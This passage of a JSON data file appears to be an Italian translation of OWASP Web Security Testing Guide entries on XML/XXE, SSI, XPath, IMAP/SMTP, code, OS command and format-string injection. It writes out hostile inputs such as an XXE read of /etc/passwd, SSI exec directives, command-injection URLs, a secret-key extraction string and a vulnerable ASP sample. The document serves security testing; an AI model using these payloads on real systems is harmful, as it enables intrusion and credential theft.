sintatticamente corretto e sempre vero. In questo modo il tester ottiene lo stato autenticato come primo utente presente nella struttura LDAP.</p>",
      "tools": "<h3>Strumenti</h3><ul><li>Softerra LDAP Browser</li></ul><h3>Riferimenti</h3><ul><li>LDAP Injection Prevention Cheat Sheet</li></ul><ul><li>Sacha Faust: LDAP Injection: Are Your Applications Vulnerable?</li><li>IBM paper: Understanding LDAP</li><li>RFC 1960: A String Representation of LDAP Search Filters</li><li>LDAP injection</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-INPV-07": {
      "summary": "<h3>Riassunto</h3><p>L’XML Injection consiste nel tentare di iniettare documenti XML nell’applicazione. Se il parser XML non valida correttamente i dati dal punto di vista contestuale, il test avrà esito positivo.</p><p>Questa sezione descrive esempi pratici di XML Injection. Si definisce innanzitutto uno scenario di comunicazione XML e i suoi principi di funzionamento. Successivamente si illustra la tecnica di discovery, dove si provano a inserire metacaratteri XML. Dopo questa fase, il tester ottiene informazioni sulla struttura XML, potendo tentare anche iniezioni di dati e tag XML (Tag Injection).</p><h3>Obiettivi del test</h3><ul><li>Identificare i punti vulnerabili a XML injection.</li><li>Valutare la tipologia e la gravità degli exploit ottenibili.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Supponiamo che una web application usi la comunicazione in stile XML per gestire la registrazione degli utenti, creando e aggiungendo un nuovo nodo user a un file xmlDb.</p><p>Supponiamo che xmlDB sia il seguente:</p><pre><code><?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <users> <user> <username> gandalf </username> <password> !c3 </password> <userid> 0 </userid> <mail> [email protected] </mail> </user> <user> <username> Stefan0 </username> <password> w1s3c </password> <userid> 500 </userid> <mail> [email protected] </mail> </user> </users></code></pre><p>Quando un utente si registra compilando un form HTML, i dati vengono ricevuti dall’applicazione (ad esempio via GET).</p><p>I seguenti valori:</p><pre><code>Username: tony\nPassword: Un6R34kb!e\nE-mail: [email protected]</code></pre><p>produrranno la richiesta:</p><p>https://www.example.com/addUser.php?username=tony&password=Un6R34kb!e& [email protected]</p><p>L’applicazione costruisce quindi il seguente nodo:</p><pre><code><user> <username> tony </username> <password> Un6R34kb!e </password> <userid> 500 </userid> <mail> [email protected] </mail> </user></code></pre><p>che viene aggiunto all’xmlDB:</p><pre><code><?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <users> <user> <username> gandalf </username> <password> !c3 </password> <userid> 0 </userid> <mail> [email protected] </mail> </user> <user> <username> Stefan0 </username> <password> w1s3c </password> <userid> 500 </userid> <mail> [email protected] </mail> </user> <user> <username> tony </username> <password> Un6R34kb!e </password> <userid> 500 </userid> <mail> [email protected] </mail> </user> </users></code></pre><p>Il primo passo per testare la presenza di vulnerabilità XML Injection è tentare l’inserimento di metacaratteri XML.</p><p>I principali metacaratteri XML sono:</p><ul><li>Apice singolo ('): se non sanificato, può causare eccezioni nel parsing XML se inserito in un attributo di tag.</li></ul><p>Esempio:</p><p><node attrib='$inputValue'/></p><p>inputValue = foo'</p><p>Risultato:</p><p><node attrib='foo''/></p><p>che genera un XML non valido.</p><ul><li>Doppio apice (\"): stesso effetto dell’apice singolo quando l’attributo è tra doppi apici.</li></ul><p><node attrib=\"$inputValue\"/></p><p>inputValue = foo\"</p><p>Risultato:</p><p><node attrib=\"foo\"\"/></p><p>XML non valido.</p><ul><li>Parentesi angolari (&lt; e &gt;): se inserite nei dati, ad esempio Username = foo&lt;, si ottiene:</li></ul><pre><code><user> <username> foo < </username> ... </user></code></pre><p>L’XML risultante non è valido.</p><ul><li>Comment tag (<!-- / -->): l’iniezione di <!-- nel parametro Username porta a:</li></ul><pre><code><user> <username> foo <!--</username> ...</code></pre><p>che non è valido.</p><ul><li>E commerciale (&): utilizzata per le entità XML. Se inserita senza essere seguita da ;, genera errori di parsing.</li></ul><p>Esempio:</p><p>Username = &foo</p><pre><code><user> <username> & foo </username> ... </user></code></pre><p>Document non valido (&foo non è definita).</p><ul><li>Delimitatori CDATA (<![CDATA[ / ]]>): sezioni per ignorare il parsing di markup.</li></ul><p>Se un input termina la sezione CDATA (]]>), si invalida il documento XML:</p><p>userName = ]]></p><p><username><![CDATA[]]>]]></username></p><p>non valido.</p><p>Se il documento XML viene usato per generare HTML e le sezioni CDATA vengono eliminate senza verifica, è possibile iniettare codice HTML/JS e ottenere XSS:</p><p>Esempio:</p><p>$HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]></p><pre><code><html> <![CDATA[<]]> script <![CDATA[>]]> alert('xss') <![CDATA[<]]> /script <![CDATA[>]]> </html></code></pre><p>che dopo il parsing diventa:</p><pre><code><script>alert('xss')</script></code></pre><p>Risultato: vulnerabilità XSS.</p><p><b>Entity esterne (XXE):</b> Si possono definire nuove entity esterne che puntano a URI. Se il parser XML non è configurato per vietare le external entity, è possibile eseguire XXE per leggere file locali/remoti o eseguire DoS.</p><p>Esempio di payload XXE:</p><pre><code><?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///etc/passwd\" > ]> <foo> &xxe; </foo></code></pre><p>Test simili con file come /dev/random, /etc/shadow, C:/boot.ini o URL remoti.</p><p>Una volta capito come è strutturato il documento XML, si può tentare di iniettare dati/tag XML. Ad esempio, inserendo:</p><pre><code>Username: tony\nPassword: Un6R34kb!e\nE-mail: [email protected] </mail><userid>0</userid><mail> [email protected]</code></pre><p>L’applicazione aggiungerà:</p><pre><code><user> ... <mail> [email protected] </mail> <userid>0</userid><mail> [email protected] </mail> </user></code></pre><p>Risultato: due tag userid. In molti casi, verrà preso il secondo valore, permettendo privilege escalation (userid=0 = admin).</p><p>Se però il documento XML viene validato da una DTD che prevede <userid> a cardinalità 1, l’attacco non funziona.</p><p>Per bypassare, si possono usare i commenti per “commentare” il nodo originale e lasciare solo quello iniettato:</p><pre><code>Username: tony\nPassword: Un6R34kb!e</password><!--\nE-mail: --><userid>0</userid><mail> [email protected]</code></pre><p>Il nodo userid originale viene commentato, lasciando solo quello iniettato.</p><h3>Code Review</h3><p>Le seguenti API Java possono essere vulnerabili a XXE se non configurate correttamente:</p><pre><code>javax.xml.parsers.DocumentBuilder\njavax.xml.parsers.DocumentBuildFactory\norg.xml.sax.EntityResolver\norg.dom4j.*\njavax.xml.parsers.SAXParser\njavax.xml.parsers.SAXParserFactory\nTransformerFactory\nSAXReader\nDocumentHelper\nSAXBuilder\nSAXParserFactory\nXMLReaderFactory\nXMLInputFactory\nSchemaFactory\nDocumentBuilderFactoryImpl\nSAXTransformerFactory\nDocumentBuilderFactoryImpl\nXMLReader\nXerces: DOMParser, DOMParserImpl, SAXParser, XMLParser</code></pre><p>Controllare che docType, external DTD e external parameter entity siano proibite nel codice.</p><ul><li>XML External Entity (XXE) Prevention Cheat Sheet</li></ul><p>Anche la libreria Java POI Office reader (< 3.10.1) può essere vulnerabile a XXE.</p><ul><li>poi-3.8.jar</li><li>poi-ooxml-3.8.jar</li></ul><p>Per il C, le keyword da cercare sono:</p><ul><li>libxml2: xmlCtxtReadMemory,xmlCtxtUseOptions,xmlParseInNodeContext,xmlReadDoc,xmlReadFd,xmlReadFile ,xmlReadIO,xmlReadMemory, xmlCtxtReadDoc ,xmlCtxtReadFd,xmlCtxtReadFile,xmlCtxtReadIO</li><li>libxerces-c: XercesDOMParser, SAXParser, SAX2XMLReader</li></ul>",
      "tools": "<h3>Strumenti</h3><ul><li>XML Injection Fuzz Strings (dal tool wfuzz)</li></ul><h3>Riferimenti</h3><ul><li>XML Injection</li><li>Gregory Steuck, “XXE (Xml eXternal Entity) attack”</li><li>OWASP XXE Prevention Cheat Sheet</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-INPV-08": {
      "summary": "<h3>Riassunto</h3><p>I web server solitamente permettono agli sviluppatori di inserire piccoli frammenti di codice dinamico all’interno di pagine HTML statiche, senza dover utilizzare veri linguaggi lato server o client. Questa funzionalità è fornita tramite le Server-Side Includes (SSI).</p><p>Le SSI sono direttive che il web server analizza prima di servire la pagina all’utente. Rappresentano un’alternativa alla scrittura di programmi CGI o all’uso di linguaggi di scripting server-side, quando occorre eseguire compiti molto semplici. Le implementazioni comuni di SSI consentono, ad esempio, di includere file esterni, impostare e stampare variabili di ambiente CGI, oppure eseguire script CGI o comandi di sistema.</p><p>Le SSI possono portare a Remote Command Execution (RCE), anche se la direttiva exec è solitamente disabilitata di default sulla maggior parte dei web server.</p><p>Si tratta di una vulnerabilità molto simile alle classiche injection di linguaggi di scripting. Una mitigazione è che il web server deve essere configurato per abilitare le SSI. Tuttavia, le vulnerabilità di SSI injection sono spesso più semplici da sfruttare, perché le direttive SSI sono facili da comprendere e molto potenti: ad esempio, permettono di visualizzare file, eseguire comandi, includere output di script esterni, ecc.</p><h3>Obiettivi del test</h3><ul><li>Identificare i punti vulnerabili alle SSI injection.</li><li>Valutare la gravità dell’injection identificata.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Per testare la presenza di SSI exploitabili, si iniettano direttive SSI come input utente. Se le SSI sono abilitate e la validazione dell’input non è corretta, il server eseguirà la direttiva. Questo comportamento è simile a una classica vulnerabilità di injection, in quanto si verifica quando l’input utente non viene correttamente validato e sanificato.</p><p>Per prima cosa occorre determinare se il web server supporta le direttive SSI. Spesso la risposta è sì, dato che il supporto SSI è piuttosto comune. Per scoprirlo, individua il tipo di web server target usando tecniche di information gathering (vedi Fingerprinting Web Server). Se hai accesso al codice, verifica nei file di configurazione del web server la presenza di direttive SSI specifiche.</p><p>Un altro modo per verificare il supporto alle SSI è cercare pagine con estensione .shtml, spesso associata alle SSI. Tuttavia, l’uso di .shtml non è obbligatorio, quindi la sua assenza non esclude vulnerabilità di SSI injection.</p><p>Lo step successivo consiste nell’identificare tutti i possibili vettori di input utente e testarli per vedere se l’iniezione SSI è realmente sfruttabile.</p><p>Trova tutte le pagine che accettano input utente. Possibili vettori includono anche header e cookie. Verifica come l’input viene memorizzato e utilizzato, ad esempio se viene restituito in un messaggio di errore o in un elemento della pagina e se subisce modifiche. L’accesso al codice sorgente può aiutare a identificare rapidamente tutti i vettori e come viene gestito l’input.</p><p>Una volta individuati i possibili punti di injection, verifica se è possibile inserire caratteri utilizzati dalle direttive SSI come <!#=/.\"-> e caratteri alfanumerici.</p><p>Il seguente esempio restituisce il valore di una variabile di ambiente:</p><pre><code><!--#echo var=\"VAR\" --></code></pre><p>Usando la direttiva include, se il file fornito è uno script CGI, la direttiva includerà il suo output. Può anche includere il contenuto di file o elencare file di una directory:</p><pre><code><!--#include virtual=\"FILENAME\" --></code></pre><p>Per ottenere l’output di un comando di sistema:</p><pre><code><!--#exec cmd=\"OS_COMMAND\" --></code></pre><p>Se l’applicazione è vulnerabile, la direttiva viene iniettata e interpretata dal server al prossimo caricamento della pagina.</p><p>Le direttive SSI possono essere iniettate anche negli header HTTP, se la web application usa quei dati per costruire pagine dinamiche:</p><pre><code>GET / HTTP/1.1\nHost: www.example.com\nReferer: <!--#exec cmd=\"/bin/ps ax\"-->\nUser-Agent: <!--#include virtual=\"/proc/version\"--></code></pre>",
      "tools": "<h3>Strumenti</h3><ul><li>Web Proxy: Burp Suite</li><li>ZAP</li><li>String searcher: grep</li></ul><h3>Riferimenti</h3><ul><li>Nginx SSI module</li><li>Apache: Module mod_include</li><li>IIS: Server-Side Includes directives</li><li>Apache Tutorial: Introduzione alle Server-Side Includes</li><li>Apache: Suggerimenti di sicurezza per la configurazione del server</li><li>SSI Injection invece di JavaScript Malware</li><li>IIS: Note sulla sintassi delle Server-Side Includes (SSI)</li><li>Header Based Exploitation</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-INPV-09": {
      "summary": "<h3>Riassunto</h3><p>XPath è un linguaggio progettato principalmente per indirizzare parti di un documento XML. Nel testing di XPath Injection si verifica se sia possibile iniettare sintassi XPath in una richiesta interpretata dall'applicazione, permettendo così a un attaccante di eseguire query XPath controllate dall'utente. Se sfruttata con successo, questa vulnerabilità può consentire di bypassare i meccanismi di autenticazione o accedere a informazioni senza autorizzazione.</p><p>Le applicazioni web utilizzano sempre più spesso database per archiviare e recuperare dati. Storicamente, i database relazionali sono stati i più diffusi, ma negli ultimi anni si è assistito alla crescita di database che organizzano i dati in formato XML. Così come i database relazionali si accedono tramite SQL, i database XML usano XPath come linguaggio di query standard.</p><p>Dal punto di vista concettuale, XPath è molto simile a SQL per scopi e applicazioni; di conseguenza, gli attacchi di XPath Injection seguono la stessa logica delle SQL Injection. In certi aspetti, XPath è persino più potente, in quanto molte funzionalità sono presenti già nelle specifiche standard, mentre in SQL molte tecniche dipendono dal dialetto utilizzato. Questo rende gli attacchi XPath Injection molto più adattabili. Un ulteriore vantaggio è che, a differenza di SQL, non sono applicati controlli di accesso (ACL): una query XPath può accedere a qualsiasi parte del documento XML.</p><h3>Obiettivi del test</h3><ul><li>Identificare i punti vulnerabili a XPath injection.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Il pattern d’attacco XPath è stato pubblicato per la prima volta da Amit Klein ed è molto simile alle classiche SQL Injection. Immaginiamo una pagina di login che gestisce l’autenticazione dove l’utente deve inserire username e password. Supponiamo che il database sia rappresentato dal seguente file XML:</p><pre><code><?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <users> <user> <username> gandalf </username> <password> !c3 </password> <account> admin </account> </user> <user> <username> Stefan0 </username> <password> w1s3c </password> <account> guest </account> </user> <user> <username> tony </username> <password> Un6R34kb!e </password> <account> guest </account> </user> </users></code></pre><p>Una query XPath che restituisce l’account il cui username è gandalf e la cui password è !c3 sarebbe:</p><p>string(//user[username/text()='gandalf' and password/text()='!c3']/account/text())</p><p>Se l’applicazione non filtra correttamente l’input, il tester può iniettare codice XPath e alterare il risultato. Ad esempio, inserendo:</p><pre><code>Username: ' or '1' = '1\nPassword: ' or '1' = '1</code></pre><p>La query diventerebbe:</p><p>string(//user[username/text()='' or '1' = '1' and password/text()='' or '1' = '1']/account/text())</p><p>Come nelle SQLi, si crea una condizione che valuta sempre a true e l’applicazione autentica l’utente anche senza credenziali valide. Il primo step è inserire un apice singolo ( ' ) nel campo per introdurre un errore di sintassi nella query, e vedere se viene restituito un messaggio d’errore.</p><p>Se non si hanno informazioni sulla struttura dati XML e l’applicazione non restituisce errori utili, è possibile ricorrere a Blind XPath Injection, con l’obiettivo di ricostruire l’intera struttura dati. La tecnica, simile all’inference-based SQLi, prevede l’iniezione di codice che restituisce un singolo bit di informazione. Il dettaglio si trova nell’articolo di Amit Klein citato tra i riferimenti.</p><h3>Riferimenti</h3><ul><li>Amit Klein: “Blind XPath Injection”</li><li>XPath 1.0 specifications</li></ul>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-INPV-10": {
      "summary": "<h3>Riassunto</h3><p>Questa minaccia riguarda tutte le applicazioni che comunicano con mail server (IMAP/SMTP), tipicamente le webmail. L’obiettivo del test è verificare la possibilità di iniettare comandi IMAP/SMTP arbitrari verso i mail server a causa di input non opportunamente sanificati.</p><p>La tecnica di IMAP/SMTP Injection è più efficace se il mail server non è direttamente accessibile da Internet. Quando la comunicazione con il backend mail server è possibile, è consigliato eseguire test diretti.</p><p>L’IMAP/SMTP Injection consente di accedere a un mail server che altrimenti non sarebbe accessibile direttamente dall’esterno. Spesso questi sistemi interni non adottano gli stessi controlli di sicurezza dei server front-end, rendendo più facili gli attacchi (vedi schema in Figura 1).</p><p>Questa tecnica permette diverse tipologie di attacco, a seconda delle funzionalità e della tecnologia del mail server target:</p><ul><li>Sfruttamento di vulnerabilità nei protocolli IMAP/SMTP</li><li>Bypass di restrizioni applicative</li><li>Evasione di controlli anti-automation</li><li>Information disclosure</li><li>Relay/SPAM</li></ul><h3>Obiettivi del test</h3><ul><li>Identificare i punti vulnerabili a IMAP/SMTP injection.</li><li>Comprendere il flusso dati e la struttura di deploy del sistema.</li><li>Valutare gli impatti della injection.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Per individuare parametri vulnerabili, il tester deve analizzare come l’applicazione gestisce l’input, inviando richieste malevole o non valide e osservando la risposta. In un’applicazione sicura la risposta dovrebbe essere un errore. Se vulnerabile, la richiesta viene inoltrata al backend, che risponde normalmente.</p><p>È importante inviare richieste che rispecchino la tecnologia sottostante. Ad esempio, per IMAP, occorre inviare comandi IMAP opportunamente costruiti.</p><p>I parametri IMAP tipici da testare sono:</p><p>Esempio: il parametro “mailbox” in:</p><p>https://<webmail>/src/read_body.php?mailbox=INBOX&passed_id=46106&startMessage=1</p><p>Esempi di test:</p><ul><li>Valore nullo:</li></ul><p>https://<webmail>/src/read_body.php?mailbox=&passed_id=46106&startMessage=1</p><ul><li>Valore casuale:</li></ul><p>https://<webmail>/src/read_body.php?mailbox=NOTEXIST&passed_id=46106&startMessage=1</p><ul><li>Valori multipli:</li></ul><p>https://<webmail>/src/read_body.php?mailbox=INBOX PARAMETER2&passed_id=46106&startMessage=1</p><ul><li>Caratteri speciali non standard (es: \\ , ' , \" , @ , # , ! , | ):</li></ul><p>https://<webmail>/src/read_body.php?mailbox=INBOX\"&passed_id=46106&startMessage=1</p><ul><li>Eliminare il parametro:</li></ul><p>https://<webmail>/src/read_body.php?passed_id=46106&startMessage=1</p><p>I risultati possibili sono:</p><ul><li>S1: L’applicazione restituisce un errore</li><li>S2: L’applicazione non restituisce errore ma non esegue l’operazione richiesta</li><li>S3: L’applicazione non restituisce errore ed esegue normalmente l’operazione</li></ul><p>Le situazioni S1 e S2 sono indicativi di una injection IMAP/SMTP riuscita.</p><p>Ad esempio, modificando il parametro mailbox con un apice doppio (%22):</p><p>https://<webmail>/src/view_header.php?mailbox=INBOX%22&passed_id=46105&passed_ent_id=0</p><p>La risposta potrebbe essere:</p><pre><code>ERROR: Bad or malformed request.\nQuery: SELECT \"INBOX\"\"\nServer responded: Unexpected extra arguments to Select</code></pre><p>Un altro test consiste nel fornire un valore alfabetico quando è atteso un numero (esempio: passed_id=test):</p><p>https://<webmail>/src/read_body.php?mailbox=INBOX&passed_id=test&startMessage=1</p><pre><code>ERROR : Bad or malformed request.\nQuery: FETCH test:test BODY[HEADER]\nServer responded: Error in IMAP command received by server.</code></pre><p>Gli errori restituiti possono rivelare dettagli sui comandi IMAP/SMTP eseguiti e i relativi parametri.</p><p>Una volta identificati i parametri vulnerabili, bisogna valutare il livello di injection e progettare i test di exploitation.</p><p>La struttura tipica di una injection IMAP/SMTP è:</p><ul><li>Header: terminazione del comando atteso</li><li>Body: iniezione di nuovo comando</li><li>Footer: ripresa del comando atteso</li></ul><p>Per eseguire effettivamente un comando IMAP/SMTP, il comando precedente deve essere terminato con CRLF (%0d%0a).</p><p>Esempio: il parametro message_id in</p><p>https://<webmail>/read_email.php?message_id=4791</p><p>Supponiamo che venga usato per costruire il comando:</p><p>FETCH 4791 BODY[HEADER]</p><p>L’injection IMAP avverrebbe con:</p><p>https://<webmail>/read_email.php?message_id=4791 BODY[HEADER]%0d%0aV100 CAPABILITY%0d%0aV101 FETCH 4791</p><pre><code>FETCH 4791 BODY[HEADER]\nV100 CAPABILITY\nV101 FETCH 4791 BODY[HEADER]</code></pre><p>Elenco dei comandi IMAP/SMTP che si possono tentare di iniettare: arbitrario, secondo RFC e funzionalità dell’applicazione.</p><h3>Riferimenti</h3><ul><li>RFC 0821 “Simple Mail Transfer Protocol”</li><li>RFC 3501 “Internet Message Access Protocol - Version 4rev1”</li></ul>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-INPV-11": {
      "summary": "<h3>Riassunto</h3><p>Questa sezione descrive come un tester può verificare se è possibile inserire del codice come input in una pagina web e farlo eseguire dal server web.</p><p>Nel test di Code Injection, il tester invia un input che viene elaborato dal server come codice dinamico o come file incluso. Questi test possono prendere di mira diversi motori di scripting lato server, ad esempio ASP o PHP. Per proteggersi da questi attacchi è fondamentale implementare una corretta validazione dell’input e seguire pratiche di sviluppo sicuro.</p><h3>Obiettivi del test</h3><ul><li>Identificare i punti di injection in cui è possibile iniettare codice nell’applicazione.</li><li>Valutare la gravità dell’injection.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Utilizzando la querystring, il tester può tentare di iniettare codice (ad esempio una URL malevola) che venga poi processata come parte di un file incluso:</p><p>https://www.example.com/uptime.php?pin=https://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a</p><p>In questo esempio, la URL malevola viene accettata come parametro dalla pagina PHP, che utilizza il valore successivamente in un include.</p><p>Un’altra possibilità è cercare nel codice ASP i punti in cui l’input dell’utente viene utilizzato in funzioni di esecuzione. Ad esempio, se l’utente può inserire comandi nel campo Data, il codice ASP potrebbe salvare l’input in un file e poi eseguirlo:</p><pre><code>&lt;%\nIf not isEmpty(Request(\"Data\")) Then\nDim fso, f\n'Input dell’utente scritto in data.txt\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nSet f = fso.OpenTextFile(Server.MapPath(\"data.txt\"), 8, True)\nf.Write Request(\"Data\") & vbCrLf\nf.close\nSet f = nothing\nSet fso = Nothing\n\n'Esecuzione di data.txt\nServer.Execute(\"data.txt\")\n\nElse\n%&gt;\n\n&lt;form&gt;\n&lt;input name=\"Data\" /&gt;&lt;input type=\"submit\" name=\"Enter Data\" /&gt;\n&lt;/form&gt;\n&lt;%\nEnd If\n%&gt;</code></pre><p>In questo caso, un utente malintenzionato può inserire codice arbitrario nel campo Data, che verrà salvato ed eseguito dal server.</p><ul><li>Insecure.org</li><li>Wikipedia</li><li>Code review per OS Injection</li></ul>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-INPV-12": {
      "summary": "<h3>Riassunto</h3><p>Questa sezione descrive come testare un’applicazione alla ricerca di vulnerabilità di OS command injection. Il tester cerca di iniettare comandi del sistema operativo tramite richieste HTTP all’applicazione.</p><p>L’OS Command Injection è una tecnica che sfrutta l’interfaccia web per eseguire comandi del sistema operativo sul server. Se l’input non viene adeguatamente sanificato, l’utente può fornire comandi arbitrari tramite la web interface, ottenendo così la possibilità di caricare programmi malevoli o persino acquisire password. La prevenzione di questo tipo di attacco richiede attenzione già in fase di design e sviluppo.</p><h3>Obiettivi del test</h3><ul><li>Individuare e valutare i punti vulnerabili all’injection di comandi OS.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Spesso, nelle webapp, il nome di un file è presente nell’URL. Ad esempio, Perl consente di effettuare un piping dei dati in una open statement. L’utente può semplicemente aggiungere il simbolo della pipe | alla fine del nome file.</p><p>Esempio URL prima della modifica:</p><p>https://sensitive/cgi-bin/userData.pl?doc=user1.txt</p><p>Esempio URL modificato:</p><p>https://sensitive/cgi-bin/userData.pl?doc=/bin/ls|</p><p>Questo farà eseguire il comando /bin/ls .</p><p>In PHP, apponendo un punto e virgola alla fine del parametro seguito da un comando OS, questo verrà eseguito. Il carattere %3B, codificato in URL, corrisponde al punto e virgola:</p><p>https://sensitive/something.php?dir=%3Bcat%20/etc/passwd</p><p>Un’altra tecnica consiste nell’invio di una richiesta POST (ad esempio tramite Burp o ZAP) in cui si inserisce il comando nel valore del parametro:</p><pre><code>POST /public/doc HTTP/1.1\nHost: www.example.com\n...\nDoc=Doc1.pdf+|+Dir c:\\</code></pre><p>Se l’applicazione non valida l’input, il comando viene eseguito dal sistema operativo.</p><h3>Caratteri speciali per l’injection</h3><p>I seguenti caratteri sono spesso utilizzati per la command injection: | ; & $ > < ' ! . Puoi anche utilizzare combinazioni come:</p><ul><li>cmd1|cmd2: Esegue cmd2 indipendentemente dal risultato di cmd1</li><li>cmd1;cmd2: Stesso concetto del punto e virgola</li><li>cmd1||cmd2: Esegue cmd2 solo se cmd1 fallisce</li><li>cmd1&&cmd2: Esegue cmd2 solo se cmd1 ha successo</li><li>$(cmd): Esegue cmd e restituisce il risultato</li></ul><p>Altri caratteri comuni: &gt;, &lt;, ( ), { }, [ ], $ , # , ~ , ! , \".</p><h3>API pericolose da cercare in code review</h3><p>Durante la revisione del codice, cerca funzioni note per introdurre rischi di injection, come:</p><ul><li>Runtime.exec()</li><li>system, exec, ShellExecute (Windows, Unix)</li><li>os.system, os.popen, subprocess.popen, subprocess.call (Python)</li><li>system, shell_exec, exec, proc_open, eval (PHP)</li></ul>",
      "tools": "<h3>Strumenti</h3><ul><li>OWASP WebGoat</li><li>Commix</li></ul><h3>Riferimenti</h3><ul><li>Penetration Testing for Web Applications (Parte 2)</li><li>CWE-78: Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)</li><li>ENV33-C. Do not call system()</li></ul>",
      "remediation": "<h3>Remediation</h3><p>L’URL e i dati dei form devono essere sanificati rispetto ai caratteri non validi. Una deny list può essere utile, ma il metodo più sicuro è l’uso di una allow list che accetti solo caratteri ammessi o valori noti. Questo consente di bloccare anche minacce non ancora scoperte. Caratteri da negare possono essere: | ; & $ > < ' \\ ! >> #. Bisogna inoltre fare escaping o filtrare tutti i caratteri speciali specifici per Windows e Linux come: ( ) < > & * ‘ | = ? ; [ ] ^ ~ ! . \" % @ / \\ : + , ` (Windows) e { } ( ) > < & * ‘ | = ? ; [ ] $ – # ~ ! . \" % / \\ : + , ` (Linux).</p><p>L’applicazione web e i suoi componenti dovrebbero essere eseguiti con permessi minimi che non consentano l’esecuzione di comandi OS. Verifica questi aspetti anche in ottica gray-box.</p>",
      "test_objectives": ""
    },
    "WSTG-INPV-13": {
      "summary": "<h3>Riassunto</h3><p>Una format string è una sequenza di caratteri terminata da null che contiene anche specificatori di conversione, interpretati o convertiti a runtime. Se il codice lato server concatena un input dell’utente a una format string, un attaccante può aggiungere ulteriori specificatori causando errori di runtime, disclosure di informazioni o buffer overflow.</p><p>I casi peggiori si verificano in linguaggi che non controllano gli argomenti e accettano il %n, che permette di scrivere in memoria. Funzioni come printf, fprintf, sprintf, snprintf in C e C++ possono consentire a un attaccante di leggere memoria o scrivere (con %n). Anche Perl printf e sprintf sono vulnerabili. Altri linguaggi, come Python (str.format) e Java (String.format, PrintStream.format) possono essere soggetti a crash o disclosure se si manipola la format string.</p><p>Il pattern classico di vulnerabilità è una funzione di formato stringa che usa input non sanificato. Ad esempio:</p><pre><code>char * userName = /* input controllato dall’utente */ ; printf(\"DEBUG Current user: \"); // Codice vulnerabile printf(userName);</code></pre><p>O in Java:</p><pre><code>final String userName = /* input controllato */ ; System.out.printf(\"DEBUG Current user: \"); System.out.printf(userName);</code></pre><p>Un attaccante può inserire conversion specifiers come %p%p%p%p%p per leggere contenuti di memoria, o %n per scrivere. In Java, uno specificatore senza argomento richiesto (%s, %x, ecc) porta a un’eccezione come IllegalFormatException. La soluzione consiste nell’usare printf(\"DEBUG Current user: %s\", userName) .</p><h3>Obiettivi del test</h3><ul><li>Valutare se l’iniezione di specificatori di conversione in campi controllati dall’utente causa comportamenti indesiderati nell’applicazione.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>I test includono sia l’analisi statica del codice sia l’invio di specificatori di conversione come input utente.</p><p>Strumenti di analisi statica possono trovare vulnerabilità sia nel codice sia nei binari. Alcuni esempi sono: Flawfinder (C/C++), FindSecurityBugs (Java, regola FORMAT_STRING_MANIPULATION), phpsa (PHP, analizzatore di formatter).</p><p>L’analisi statica può mancare casi più sottili in cui la format string è generata dinamicamente. L’analisi manuale consiste nel cercare tutte le chiamate a funzioni che accettano format string e verificare che non sia mai influenzata da input non affidabile.</p><p>Durante il test dinamico, si inviano conversion specifiers come input tramite browser o strumenti API, osservando la risposta. Spesso i conversion specifiers contengono caratteri speciali e vanno url-encoded (es: %25s%25s%25s%25n per %s%s%s%n). Se il sito è vulnerabile, la risposta potrà essere un errore (timeout o HTTP 500) o output inatteso.</p><p>Esempio di test automatico con wfuzz:</p><pre><code>fuzz.txt:\nalice\n%s%s%s%n\n%p%p%p%p%p\n{event.__init__.__globals__[CONFIG][SECRET_KEY]}</code></pre><p>Il file contiene un input valido (alice), stringhe con conversion specifiers C, e uno per Python. Il comando di fuzzing sarà:</p><pre><code>wfuzz -c -z file,fuzz.txt,urlencode https://vulnerable_host/userinfo?username=FUZZ</code></pre><p>Se l’applicazione è vulnerabile a conversion specifiers C come %s o %p, la risposta HTTP sarà 500 oppure verrà mostrato un output inatteso.</p>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-INPV-14": {
      "summary": "<h3>Riassunto</h3><p>Definite anche attacchi persistenti, le incubated vulnerabilities sono una tipologia complessa che richiede la presenza simultanea di più vulnerabilità di validazione dei dati. Tali vulnerabilità sono tipicamente utilizzate per realizzare attacchi di tipo “watering hole” contro utenti di applicazioni web legittime.</p><p>Le vulnerabilità incubate presentano le seguenti caratteristiche:</p><ul><li>L’attacco deve essere innanzitutto persistito: il vettore viene memorizzato nello strato di persistenza, situazione possibile solo se c’è una validazione debole dell’input o se i dati arrivano tramite canali alternativi (es. una console admin o un processo batch backend).</li><li>Successivamente, quando il vettore viene “richiamato” (ad esempio visualizzato da un altro utente), deve essere eseguito con successo. Un esempio classico è l’XSS persistente, che necessita di validazione debole in output per poter iniettare lo script lato client.</li></ul><p>Lo sfruttamento di queste vulnerabilità consente a un attaccante di inserire dati che verranno successivamente recuperati ed eseguiti da utenti inconsapevoli o da altri componenti del sistema, innescando vulnerabilità secondarie.</p><p>Durante un penetration test, gli attacchi incubati consentono di valutare la criticità di alcune vulnerabilità, mostrando come un problema di sicurezza possa essere sfruttato per orchestrare attacchi client-side su larga scala, colpendo molti utenti contemporaneamente.</p><p>Questi attacchi asincroni coprono una vasta gamma di vettori, tra cui:</p><ul><li>Componenti di upload file che permettono di caricare media corrotti o file attivi (es. immagini con payload, file eseguibili, pagine web con componenti attivi).</li><li>Vulnerabilità XSS persistente in forum pubblici, 